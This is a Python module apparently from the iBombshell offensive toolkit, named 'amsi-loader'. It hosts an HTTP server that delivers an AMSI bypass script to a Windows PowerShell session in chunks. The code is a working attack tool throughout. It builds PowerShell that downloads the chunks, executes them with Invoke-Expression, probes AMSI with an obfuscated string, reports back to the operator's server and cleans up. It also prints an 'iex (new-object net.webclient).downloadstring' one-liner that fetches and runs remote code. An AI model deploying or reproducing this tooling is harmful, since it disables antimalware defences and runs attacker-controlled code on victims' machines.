import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
import re
from threading import Thread
from termcolor import colored, cprint
from printib import print_ok, print_info, print_error
from urllib.parse import parse_qs, unquote, urlparse
from module import Module

FUNCTION = ''
BYPASS_BLOCKS = []
BYPASS_SENT = False
BYPASS_SENT_ERROR = False

class SendBypass(BaseHTTPRequestHandler):
    # Para evitar logs en la pantalla
    def log_message(self, format, *args):
        return

    def _set_response(self, code=200):
        self.send_response(code)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global FUNCTION, BYPASS_BLOCKS

        parsed_path = urlparse(self.path)
        path = parsed_path.path
        match = re.match(r'/block/(\d+)', path)
        if path == '/':
            response = FUNCTION.encode('utf-8')
        elif match:
            index = int(match.group(1))
            command = BYPASS_BLOCKS[index] if index < len(BYPASS_BLOCKS) else ''
            response = command.encode('utf-8')
        else:
            response = b'Not Found'

        self._set_response()
        self.wfile.write(response)

    def do_POST(self):
        global BYPASS_SENT, BYPASS_SENT_ERROR

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self._set_response()

        self.wfile.write(b'')

        try:
            post_data = post_data.decode()
            fields = parse_qs(post_data)
            results = fields.get('results', [''])[0]
            recv = unquote(results)

            if recv.startswith('Error'):
                print_error(recv)
                BYPASS_SENT_ERROR = True
            else:
                print_info(recv)
                BYPASS_SENT = True

        except Exception as e:
            print_error(f"Error reading results at file upload: {e}")
            BYPASS_SENT_ERROR = True

    def do_HEAD(self):
        self._set_response()

class CustomModule(Module):
    def __init__(self):
        information = {
            "Name": "amsi-loader",
            "Description": "AMSI bypass script loader. This script is capable of loading an AMSI bypass file in blocks. The size of each block is defined by a file containing line numbers. It can be used to download the iBombshell console and generate a new warrior. To achieve this, the 'generate/powershell' module should be used, and the command should be pasted into the instruction option.",
            "Author": "@pilarclares"
        }

        options = {
            "ip": [None, "IP address of the server to connect to", True],
            "port": ["8082", "Port where the server is listening", True],
            "destination": ["$env:TMP\\amlo", "Directory containing the files", True],
            "filePath": [None, "Path to the bypass file", True],
            "lineNumbers": [None, "Path to the file containing line numbers for blocks", False],
            "instruction": [None, "Instruction to execute after bypassing AMSI", False]
        }

        super(CustomModule, self).__init__(information, options)
    
    def run_module(self):
        global BYPASS_SENT, BYPASS_SENT_ERROR, BYPASS_BLOCKS, FUNCTION

        BYPASS_SENT = False
        BYPASS_SENT_ERROR = False
        BYPASS_BLOCKS = []
        FUNCTION = ''

        function = """
        function chargeFiles {
            param (
                [Parameter(Mandatory)]
                [string] $sourceUri,
                [Parameter(Mandatory)]
                [string] $destination
            )
            
            try {
                $req = iwr -UseBasicParsing -uri $sourceUri -Method GET
                Set-Content -Path $destination -Value $req.Content -Encoding utf8
            }
            catch {
                $errorMessage = "Error sending the file $destination."
                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results=$errorMessage}
            }
        }

        function loader {
            param (
                [string]$directory,
                [string[]]$files
            )

            if (-not $directory -and -not $files) {
                return "Error: At least one of the parameters `$directory or `$files must be provided."
            }

            if ($directory) {
                if (-Not (Test-Path $directory)) {
                    return "Error: The directory $directory does not exist."
                }

                $files = Get-ChildItem -Path $directory -Recurse -File | Select-Object -ExpandProperty FullName
            }

            foreach ($filePath in $files) {
                if (-Not (Test-Path $filePath)) {
                    return "Error: The file $filePath does not exist."
                }

                try {
                    $content = Get-Content -Path $filePath -Raw
                    Invoke-Expression $content -ErrorAction Stop | Out-Null
                } catch {
                    return "Error executing commands from the file $filePath."
                }
            }

            try {
                $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'
                Invoke-Expression $command -ErrorAction Stop | Out-Null
                return "Success: AMSI bypassed successfully."
            } catch {
                if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
                    return "Fail: AMSI is still active."
                } else {
                    return "Success: AMSI bypassed successfully."
                }
            }
        }
        """
        with open(self.args["filePath"], 'r') as file:
            lines = file.readlines()
        
        sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
        destination = self.args["destination"]

        function += f'$directoryPath = "{destination}"; $sourceUri = "{sourceUri}"\n'
        function += """
        if (Test-Path -Path $directoryPath) {
            Remove-Item -Path $directoryPath -Recurse -Force
        }
        New-Item -Path $directoryPath -ItemType Directory | Out-Null
        """ # Create a new directory and delete content if it existed
        
        auxLine = 0
        if self.args["lineNumbers"]:
            with open(self.args["lineNumbers"], 'r') as metadata:
                for index, lineNumber in enumerate(metadata, start=0):
                    lineNumber = lineNumber.strip()
                    try:
                        lineNumber = int(lineNumber)
                    except ValueError:
                        print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
                        return
                    
                    if len(lines) < lineNumber:
                        print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
                        return

                    command = ''.join(lines[auxLine:lineNumber])
                    BYPASS_BLOCKS.append(command)
                    function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
                    auxLine = lineNumber
                
            if auxLine < len(lines):
                command = ''.join(lines[auxLine:])
                BYPASS_BLOCKS.append(command)
                index += 1
                function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
        
        else: # send script complete
            command = ''.join(lines)
            BYPASS_BLOCKS.append(command)
            function += f'chargeFiles -sourceUri {sourceUri}block/0 -destination {destination}\\part0\n'

        function += f"$result = loader -directory {destination}\n"
        function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n" # Send result to server
        function += f"Remove-Item -Path {destination} -Recurse -Force\n" # Delete new directory and files

        if self.args["instruction"]:
            function += self.args["instruction"]

        FUNCTION = function
        
        server = Thread(target=self.run, name='amsi-loader server', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
        server.start()

        print_ok(f"Everything is ready. To bypass AMSI execute this on a Powershell instance:\niex (new-object net.webclient).downloadstring('{sourceUri}')")

        while not BYPASS_SENT and not BYPASS_SENT_ERROR:
            pass

        if BYPASS_SENT_ERROR:
            print_error('An error occurred while sending the script.')

    def run(self, server_class=HTTPServer, handler_class=SendBypass, address=None, port=8082):
        try:
            server_address = (address, port)
            httpd = server_class(server_address, handler_class)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
            finally:
                httpd.server_close()
        except Exception as e:
            print_error(f"Server error: {e}")
